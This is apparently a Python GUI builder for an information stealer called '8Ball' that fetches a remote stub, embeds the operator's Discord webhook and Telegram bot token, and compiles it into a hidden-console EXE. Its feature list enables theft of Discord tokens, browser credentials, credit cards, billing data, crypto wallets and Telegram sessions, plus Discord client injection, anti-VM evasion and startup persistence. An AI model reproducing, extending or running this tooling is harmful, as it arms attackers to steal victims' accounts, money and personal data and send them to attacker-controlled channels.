import os
import sys
import json
import shutil
import webbrowser
import random
import re
import subprocess
import urllib.request
import threading
from tkinter import filedialog, messagebox
import customtkinter as ctk
from tkinter import ttk
# --- INITIAL SETUP ---
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.join(SCRIPT_DIR, "Build_Project")
FILE_NAME = os.path.join(PROJECT_DIR, 'rx.py')
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue") 

if not os.path.exists(PROJECT_DIR):
    os.makedirs(PROJECT_DIR)
script_rx = os.path.join(SCRIPT_DIR, 'rx.py')
if os.path.exists(script_rx) and not os.path.exists(FILE_NAME):
    shutil.move(script_rx, FILE_NAME)

# --- THEME COLORS ---
LOGOCOLOR = "#ffffff"
BG_COLOR = "#16161d"
SIDEBAR_COLOR = "#16161d"
ACCENT_BLUE = "#797979"
TEXT_SUB = "#c3c4c5"
GENBUTTON_COLOR = "#FDFDFD"
STATUS = "#00ffaa"
# --- FUNCTIONS ---
def download_online_stub():
    try:
        with open(FILE_NAME, 'r', encoding='utf-8') as f:
            src = f.read()
        m = re.search(r'^SRC_URL\s*=\s*"([^"]*)"', src, re.MULTILINE)
        if not m or not m.group(1):
            return True
        url = m.group(1)
        print(f"[RX Builder] Fetching stub from: {url}")
        resp = urllib.request.urlopen(url, timeout=30)
        new_src = resp.read().decode('utf-8')
        with open(FILE_NAME, 'w', encoding='utf-8') as f:
            f.write(new_src)
        print("[RX Builder] Stub downloaded successfully.")
        return True
    except Exception as e:
        messagebox.showerror("Download Error", f"Failed to download stub:\n{e}")
        return False
def validate_webhook(webhook):
    return webhook and 'api/webhooks' in webhook

def replace_webhook(webhook):
    if not os.path.exists(FILE_NAME):
        messagebox.showerror("Error", f"{FILE_NAME} not found!")
        return False

    webhook = webhook.strip()
    import base64
    b64 = base64.b64encode(webhook.encode()).decode()

    with open(FILE_NAME, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    with open(FILE_NAME, 'w', encoding='utf-8') as file:
        for line in lines:
            if line.strip().startswith('_HOOK_B64 ='):
                indent = ' ' * (len(line) - len(line.lstrip()))
                file.write(f'{indent}_HOOK_B64 = "{b64}"\n')
            else:
                file.write(line)
    return True

def update_feature_config_string(key: str, value) -> bool:
    if not os.path.exists(FILE_NAME):
        messagebox.showerror("Error", f"{FILE_NAME} not found!")
        return False

    with open(FILE_NAME, "r", encoding="utf-8") as f:
        src = f.read()

    # Find the key inside FEATURE_CONFIG = { ... }
    pattern = rf'("{key}"):\s*"[^"]*"'
    replacement = rf'\1: "{value}"'
    new_src = re.sub(pattern, replacement, src)

    if new_src == src:
        # Key not found; try adding it before the closing brace
        marker = "FEATURE_CONFIG = {"
        start = src.find(marker)
        if start == -1:
            messagebox.showerror("Error", "FEATURE_CONFIG block not found.")
            return False
        end = src.find("}", start)
        if end == -1:
            messagebox.showerror("Error", "Malformed FEATURE_CONFIG block.")
            return False
        new_src = src[:end] + f'    "{key}": "{value}",\n' + src[end:]

    with open(FILE_NAME, "w", encoding="utf-8") as f:
        f.write(new_src)
    return True


def update_feature_config(selected_features: list[str]) -> bool:
    """
    Update FEATURE_CONFIG in rx.py based on selected GUI features.
    """
    if not os.path.exists(FILE_NAME):
        messagebox.showerror("Error", f"{FILE_NAME} not found!")
        return False

    # Map GUI labels to FEATURE_CONFIG keys in rx.py
    # IMPORTANT: these labels MUST match the checkbox labels in the GUI (features dict) exactly
    feature_map = {
        "Discord Token Stealer": "discord_tokens",
        "Browser Credentials": "browser_credentials",
        "Local Files": "file_search",
        "Discord JavaScript Injection": "discord_injection",
        "Anti-Debugging/VM": "anti_debug",
        "IP and Location Information": "ip_location_info",
        "Nitro": "nitro_badges_info",
        "User Billing Information": "user_billing_info",
        "Discord Gift Codes": "discord_gift_codes",
        "Crypto Wallet": "wallet_gaming_data",
        "Telegram": "telegram_desktop",
        "Debug Mode": "debug_mode",
        "Startup Persistence": "startup_persistence",
    }
    browser_sub_features = ["browser_autofill_history", "browser_bookmarks", "browser_credit_cards"]

    # Build a dict of FEATURE_CONFIG booleans
    config = {}
    for label, key in feature_map.items():
        config[key] = label in selected_features
    # When Browser Credentials is selected, enable all browser sub-features
    if config.get("browser_credentials"):
        for sub_key in browser_sub_features:
            config[sub_key] = True

    # Serialize into Python dict literal on one line
    config_literal = "{\n"
    for key, val in config.items():
        config_literal += f'    "{key}": {str(val)},\n'
    config_literal += "}"

    # Rewrite FEATURE_CONFIG block in rx.py
    with open(FILE_NAME, "r", encoding="utf-8") as f:
        src = f.read()

    # Replace the existing FEATURE_CONFIG = { ... } block.
    # We look for the first occurrence of 'FEATURE_CONFIG = {' and its closing '}'.
    marker = "FEATURE_CONFIG = {"
    start = src.find(marker)
    if start == -1:
        messagebox.showerror("Error", "FEATURE_CONFIG block not found in rx.py.")
        return False

    # Find matching closing '}' from that position
    end = src.find("}", start)
    if end == -1:
        messagebox.showerror("Error", "Malformed FEATURE_CONFIG block in rx.py.")
        return False

    # Replace the whole block
    new_src = src[:start] + f"FEATURE_CONFIG = {config_literal}\n" + src[end + 1 :]

    with open(FILE_NAME, "w", encoding="utf-8") as f:
        f.write(new_src)

    return True

def check_dependencies():
    """Verify required packages are installed before building."""
    required = {
        "Crypto.Cipher": "pycryptodome",
        "customtkinter": "customtkinter",
        "PyInstaller": "pyinstaller",
        "PIL": "pillow",
    }
    missing = []
    for mod, pkg in required.items():
        try:
            __import__(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        msg = (
            "Missing required dependencies:\n  " + "\n  ".join(missing) +
            "\n\nInstall them with:\n  pip install " + " ".join(missing)
        )
        messagebox.showerror("Missing Dependencies", msg)
        return False
    return True

def build_exe():
    if not check_dependencies():
        return

    webhook = entry.get().strip()
    if not validate_webhook(webhook):
        messagebox.showerror("Auth Error", "Please provide a valid Discord Webhook URL.")
        return

    selected_features = [name for name, var in features.items() if var.get()]
    if not selected_features:
        messagebox.showerror("No Features Selected", "No features selected.\nBuild aborted.")
        return

    terminal_write("[8Ball] Selected features: " + ", ".join(selected_features) + "\n")

    if not download_online_stub():
        return

    if not replace_webhook(webhook):
        return

    if not update_feature_config(selected_features):
        return

    tg_token = tg_entry.get().strip()
    tg_chat = tg_chat_entry.get().strip()
    update_feature_config_string("telegram_bot_token", tg_token)
    update_feature_config_string("telegram_chat_id", tg_chat)
    ping_user_val = ping_var.get()
    with open(FILE_NAME, "r", encoding="utf-8") as f:
        src = f.read()
    pattern = r'("ping_user"):\s*(True|False|"[^"]*")'
    if re.search(pattern, src):
        src = re.sub(pattern, rf'\1: {str(ping_user_val)}', src)
    else:
        marker = "FEATURE_CONFIG = {"
        start = src.find(marker)
        if start != -1:
            end = src.find("}", start)
            if end != -1:
                src = src[:end] + f'    "ping_user": {str(ping_user_val)},\n' + src[end:]
    with open(FILE_NAME, "w", encoding="utf-8") as f:
        f.write(src)

    icon_option = ""
    if check_var.get() == "on":
        icon_path = filedialog.askopenfilename(filetypes=[("Icon", "*.ico")])
        if icon_path:
            icon_option = f' --icon="{icon_path}"'

    console_flag = "--noconsole"  # Debug logs go to Discord embed, not console
    # Remove stale spec file so PyInstaller regenerates with correct flags
    spec_path = os.path.join(PROJECT_DIR, FILE_NAME.replace(".py", ".spec"))
    if os.path.exists(spec_path):
        os.remove(spec_path)
    cmd = f'"{sys.executable}" -m PyInstaller {console_flag} --onefile --clean --noconfirm{icon_option} "{FILE_NAME}"'
    terminal_write(f"[8Ball] Starting build: {cmd}\n")

    def run_build():
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                cwd=PROJECT_DIR,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
        except Exception as e:
            terminal_write(f"[8Ball] ERROR: Failed to start build: {e}\n")
            app.after(0, lambda: status_label.configure(text="STATUS: ERROR", text_color="#ef4444"))
            return

        for line in iter(proc.stdout.readline, ""):
            if not line:
                break
            terminal_write(line)

        proc.stdout.close()
        proc.wait()

        if proc.returncode == 0:
            app.after(0, lambda: status_label.configure(text="STATUS: BUILD FINISHED", text_color="#10b981"))
            terminal_write("[8Ball] Build completed successfully.\n")
            app.after(0, lambda: messagebox.showinfo("Build Finished", "Build completed successfully."))
        else:
            app.after(0, lambda: status_label.configure(text="STATUS: BUILD FAILED", text_color="#ef4444"))
            terminal_write(f"[8Ball] Build failed with exit code {proc.returncode}.\n")
            app.after(0, lambda: messagebox.showerror("Build Failed",
                f"Build process exited with code {proc.returncode}.\n\nCheck the build output terminal for details."))

    terminal_write("[8Ball] Config written. Starting PyInstaller...\n")
    app.after(0, lambda: status_label.configure(text="STATUS: BUILDING...", text_color=STATUS))
    threading.Thread(target=run_build, daemon=True).start()
def test_webhook():
    webhook = entry.get().strip()
    if not validate_webhook(webhook):
        messagebox.showerror("Test Failed", "Please provide a valid Discord Webhook URL.")
        return
    webhook = webhook.strip()
    try:
        payload = {"content": "Webhook test from 8Ball Builder - connection OK!"}
        data = json.dumps(payload).encode()
        req = urllib.request.Request(webhook, data=data, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        urllib.request.urlopen(req, timeout=15)
        messagebox.showinfo("Test Successful", "Webhook is valid and message sent successfully.")
    except Exception as e:
        messagebox.showerror("Test Failed", f"Failed to send test message:\n{e}")

def open_link(url):
    webbrowser.open(url)

# --- UPDATE CHECK ---
LOCAL_VERSION = "2.0.4"
VERSION_URL = "https://raw.githubusercontent.com/Lux00001/8Ball/main/version.json"
_pending_update_data = None
_pending_update_version = ""

def version_tuple(v):
    try:
        parts = []
        for x in v.split("."):
            digits = "".join(c for c in x if c.isdigit())
            parts.append(int(digits) if digits else 0)
        return tuple(parts)
    except:
        return (0,)

def _get_installed_version():
    """Get the actually installed version from version.json, or fallback to LOCAL_VERSION."""
    versions = []
    VERSION_JSON_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "version.json")
    if os.path.exists(VERSION_JSON_PATH):
        try:
            with open(VERSION_JSON_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
                v = data.get("version", "")
                if v:
                    versions.append(version_tuple(v))
        except:
            pass
    if LOCAL_VERSION:
        try:
            versions.append(version_tuple(LOCAL_VERSION))
        except:
            pass
    if versions:
        max_v = max(versions)
        return ".".join(str(x) for x in max_v)
    return LOCAL_VERSION

def check_for_updates():
    app.after(0, lambda: terminal_write("[8Ball] Checking for update...\n"))
    try:
        installed = _get_installed_version()
        req = urllib.request.Request(VERSION_URL, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=10)
        data = json.loads(resp.read().decode())
        remote = data.get("version", "")
        if remote and version_tuple(remote) > version_tuple(installed):
            app.after(0, lambda: _show_update_ready(data, remote))
        else:
            app.after(0, lambda: terminal_write("[8Ball] Up to date.\n"))
    except Exception:
        app.after(0, lambda: terminal_write("[8Ball] Update check failed (offline or no remote).\n"))

def _show_update_ready(data, remote):
    global _pending_update_data, _pending_update_version
    _pending_update_data = data
    _pending_update_version = remote
    installed = _get_installed_version()
    app.after(0, lambda: status_label.configure(text=f"STATUS: v{installed}", text_color=TEXT_SUB))
    app.after(0, lambda: update_btn.configure(text=f"Update v{remote} ready", text_color="#4AA9F7"))
    app.after(0, lambda: update_btn.pack(side="top", anchor="e", pady=(0, 5)))
    terminal_write(f"[8Ball] Update v{remote} available. Click the button to install.\n")

def prompt_update():
    if not _pending_update_data:
        return
    remote = _pending_update_version
    if not messagebox.askyesno("Update Available", f"Version {remote} is available.\nDownload and update now?"):
        terminal_write("[8Ball] Update skipped.\n")
        return
    data = _pending_update_data
    terminal_write(f"[8Ball] Updating to v{remote}...\n")
    remote_files = data.get("files", {})
    base = os.path.dirname(os.path.abspath(__file__))
    mappings = {
        "rx.py": os.path.join(base, "Build_Project", "rx.py"),
        "builder.pyw": os.path.join(base, "builder.pyw"),
    }
    try:
        for key, url in remote_files.items():
            path = mappings.get(key)
            if not path:
                continue
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            resp = urllib.request.urlopen(req, timeout=30)
            content = resp.read()
            
            # Patch the LOCAL_VERSION inside builder.pyw text directly
            if key == "builder.pyw":
                try:
                    text = content.decode('utf-8')
                    text = re.sub(r'LOCAL_VERSION\s*=\s*"[^"]*"', f'LOCAL_VERSION = "{remote}"', text, count=1)
                    content = text.encode('utf-8')
                except Exception as e_patch:
                    print(f"Failed to patch LOCAL_VERSION inside builder.pyw: {e_patch}")
                    
            with open(path, "wb") as f:
                f.write(content)
        
        # Download and update the local version.json file
        try:
            req_v = urllib.request.Request(VERSION_URL, headers={"User-Agent": "Mozilla/5.0"})
            resp_v = urllib.request.urlopen(req_v, timeout=10)
            content_v = resp_v.read()
            with open(os.path.join(base, "version.json"), "wb") as f_v:
                f_v.write(content_v)
        except Exception as e_v:
            print(f"[8Ball] Failed to update local version.json: {e_v}")

        terminal_write("[8Ball] Update complete. Restarting...\n")
        messagebox.showinfo("Update Complete", f"Updated to v{remote}. The builder will now restart.")
        
        # Self restart
        subprocess.Popen([sys.executable, __file__])
        app.destroy()
        sys.exit()
    except Exception as e:
        terminal_write(f"[8Ball] Update failed: {e}\n")
        messagebox.showerror("Update Failed", f"Could not download update:\n{e}")

# --- GUI LAYOUT ---
app = ctk.CTk()
app.title("8ball v2.0 | ALPHA")
app.geometry("680x720")
app.configure(fg_color=BG_COLOR)
app.resizable(False, False)

# Set app window icon (app logo)
# Place a file like 'rx_logo.ico' next to this script, or change the filename below.
ICON_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "img\\img.ico")
if os.path.isfile(ICON_PATH):
    try:
        app.iconbitmap(ICON_PATH)
    except Exception:
        # Ignore if platform/ctk backend doesn't support setting icon this way
        pass

# Sidebar Navigation
sidebar = ctk.CTkFrame(app, width=200, corner_radius=0, fg_color=SIDEBAR_COLOR, border_width=0)
sidebar.pack(side="left", fill="y")

logo_label = ctk.CTkLabel(sidebar, text="8ball", font=("Impact", 32), text_color=LOGOCOLOR)
logo_label.pack(pady=(30, 5))
sub_logo = ctk.CTkLabel(sidebar, text="STEALTH ENGINE", font=("Arial Bold", 10), text_color=LOGOCOLOR)
sub_logo.pack(pady=(0, 40))

# Contact Links in Sidebar
ctk.CTkLabel(sidebar, text="PROJECT LINKS", font=("Arial Bold", 11), text_color=LOGOCOLOR).pack(pady=(10, 5))

site_btn = ctk.CTkButton(sidebar, text="Official Site", fg_color="transparent", text_color="white", 
                         hover_color="#1e1e26", anchor="w", command=lambda: open_link('https://guns.lol/ricksanchez./'))
site_btn.pack(fill="x", padx=10, pady=2)

disc_btn = ctk.CTkButton(sidebar, text="Discord Server", fg_color="transparent", text_color="white", 
                         hover_color="#1e1e26", anchor="w", command=lambda: open_link('https://discord.gg/RRssgdghWu'))
disc_btn.pack(fill="x", padx=10, pady=2)


# --- MAIN CONFIGURATION PANEL (NATIVE CTK) ---
tabview = ctk.CTkTabview(
    app, 
    fg_color=BG_COLOR, 
    segmented_button_fg_color=BG_COLOR,
    segmented_button_selected_color="#1e1e26", 
    segmented_button_selected_hover_color="#1e1e26",
    segmented_button_unselected_color=BG_COLOR,
    segmented_button_unselected_hover_color="#16161d",
    text_color="white"
)
tabview.pack(side="right", fill="both", expand=True, padx=10, pady=10)

tabview.add("Main Configuration")
tabview.add("Feature Selection")

content1 = tabview.tab("Main Configuration")
content2 = tabview.tab("Feature Selection")

# Main Configuration Panel Content
title = ctk.CTkLabel(content1, text="Payload Configuration", font=("Arial Bold", 22), text_color="white")
title.pack(anchor="w", pady=(10, 5))
desc = ctk.CTkLabel(content1, text="Target: rx.py | Compile into secure standalone EXE.", font=("Arial", 12), text_color=TEXT_SUB)
desc.pack(anchor="w", pady=(0, 25))

entry_label = ctk.CTkLabel(content1, text="DISCORD WEBHOOK URL", font=("Arial Bold", 11), text_color=ACCENT_BLUE)
entry_label.pack(anchor="w", pady=(10, 5))
entry_frame = ctk.CTkFrame(content1, fg_color="transparent")
entry_frame.pack(anchor="w")
entry = ctk.CTkEntry(entry_frame, width=340, height=45, placeholder_text="Paste your webhook here...", 
                     fg_color="#1c1c24", border_color="#2d2d3a", corner_radius=8)
entry.pack(side="left")
test_btn = ctk.CTkButton(entry_frame, text="Test", width=60, height=45, corner_radius=8,
                         font=("Arial Bold", 12), fg_color=ACCENT_BLUE, hover_color="#4AA9F7",
                         command=lambda: test_webhook())
test_btn.pack(side="left", padx=(6, 0))

check_var = ctk.StringVar(value="off")
checkbox = ctk.CTkCheckBox(content1, text="Add Custom Icon (.ico)", variable=check_var, 
                           onvalue="on", offvalue="off", font=("Arial", 12))
checkbox.pack(anchor="w", pady=(25, 5))

# Telegram Bot Token
ctk.CTkLabel(content1, text="TELEGRAM BOT TOKEN (optional)", font=("Arial Bold", 11), text_color=ACCENT_BLUE).pack(anchor="w", pady=(10, 2))
tg_entry = ctk.CTkEntry(content1, width=380, height=35, placeholder_text="Bot token for Telegram alerts...",
                         fg_color="#1c1c24", border_color="#2d2d3a", corner_radius=8)
tg_entry.pack(anchor="w")

# Telegram Chat ID
ctk.CTkLabel(content1, text="TELEGRAM CHAT ID (optional)", font=("Arial Bold", 11), text_color=ACCENT_BLUE).pack(anchor="w", pady=(10, 2))
tg_chat_entry = ctk.CTkEntry(content1, width=380, height=35, placeholder_text="Chat ID for Telegram alerts...",
                             fg_color="#1c1c24", border_color="#2d2d3a", corner_radius=8)
tg_chat_entry.pack(anchor="w")

# Ping All (checkbox)
ping_var = ctk.BooleanVar(value=False)
ping_check = ctk.CTkCheckBox(content1, text="Ping @everyone on each message", variable=ping_var,
                              onvalue=True, offvalue=False, font=("Arial", 12))
ping_check.pack(anchor="w", pady=(20, 5))

btn_frame = ctk.CTkFrame(content1, fg_color="transparent")
btn_frame.pack(fill="x", side="bottom", pady=20)

button = ctk.CTkButton(btn_frame, text="GENERATE PAYLOAD", width=220, height=50, corner_radius=10,
                       font=("Arial Bold", 14), fg_color=ACCENT_BLUE, hover_color="#4AA9F7", command=build_exe)
button.pack(side="left")

right_frame = ctk.CTkFrame(btn_frame, fg_color="transparent")
right_frame.pack(side="right", padx=10)

update_btn = ctk.CTkButton(right_frame, text="", fg_color="transparent", hover_color="#1e1e26",
                           font=("Arial Bold", 10, "underline"), anchor="e", width=0,
                           command=prompt_update)
# hidden until check_for_updates finds something

status_label = ctk.CTkLabel(right_frame, text="STATUS: READY", font=("Arial Bold", 10), text_color=TEXT_SUB)
status_label.pack(side="bottom", anchor="e")

# Terminal / Console output area
terminal_frame = ctk.CTkFrame(content1, fg_color="#0c0c12", corner_radius=6)
terminal_frame.pack(fill="both", expand=True, pady=(10, 0))
terminal_header = ctk.CTkLabel(terminal_frame, text=" BUILD OUTPUT", font=("Consolas", 9, "bold"), text_color="#888888", anchor="w")
terminal_header.pack(fill="x", padx=6, pady=(4, 0))
terminal = ctk.CTkTextbox(
    terminal_frame, height=160, fg_color="#0c0c12", text_color="#d4d4d4",
    font=("Consolas", 10), wrap="word", border_spacing=4, state="disabled"
)
terminal.pack(fill="both", expand=True, padx=4, pady=(0, 4))

def terminal_write(msg):
    """Thread-safe append to the terminal textbox."""
    def _append():
        terminal.configure(state="normal")
        terminal.insert("end", msg)
        terminal.see("end")
        terminal.configure(state="disabled")
    app.after(0, _append)

# Feature Selection Panel Content with scrollable area
feature_label = ctk.CTkLabel(content2, text="Select Features", font=("Arial Bold", 14), text_color="white")
feature_label.pack(anchor="w", pady=(0, 10))

# Create a scrollable frame inside content2
feature_canvas = ctk.CTkCanvas(content2, bg=BG_COLOR, highlightthickness=0, bd=0)
feature_canvas.pack(fill="both", expand=True, side="left")

feature_scrollbar = ctk.CTkScrollbar(content2, orientation="vertical", command=feature_canvas.yview)
feature_scrollbar.pack(fill="y", side="right")

feature_canvas.configure(yscrollcommand=feature_scrollbar.set)

# Inner frame that holds the checkboxes
feature_inner = ctk.CTkFrame(feature_canvas, fg_color=BG_COLOR)
feature_canvas.create_window((0, 0), window=feature_inner, anchor="nw")

def on_canvas_configure(event):
    feature_canvas.configure(scrollregion=feature_canvas.bbox("all"))

feature_inner.bind("<Configure>", on_canvas_configure)

# Bind mouse wheel to scroll
def _on_mousewheel(event):
    # Windows / Linux style
    feature_canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")

feature_canvas.bind_all("<MouseWheel>", _on_mousewheel)

features = {
    "Discord Token Stealer": ctk.BooleanVar(value=False),
    "Browser Credentials": ctk.BooleanVar(value=False),
    "Local Files": ctk.BooleanVar(value=False),
    "Discord JavaScript Injection": ctk.BooleanVar(value=False),
    "Anti-Debugging/VM": ctk.BooleanVar(value=False),
    "IP and Location Information": ctk.BooleanVar(value=False),
    "Nitro": ctk.BooleanVar(value=False),
    "User Billing Information": ctk.BooleanVar(value=False),
    "Discord Gift Codes": ctk.BooleanVar(value=False),
    "Crypto Wallet": ctk.BooleanVar(value=False),     
    "Telegram": ctk.BooleanVar(value=False),
    "Debug Mode": ctk.BooleanVar(value=False),
    "Startup Persistence": ctk.BooleanVar(value=False),
}

for feature, var in features.items():
    ctk.CTkCheckBox(
        feature_inner,
        text=feature,
        variable=var,
        onvalue=True,
        offvalue=False,
        font=("Arial", 12)
    ).pack(anchor="w", pady=5)

# Check for updates on startup (non-blocking thread)
threading.Thread(target=check_for_updates, daemon=True).start()

app.mainloop()
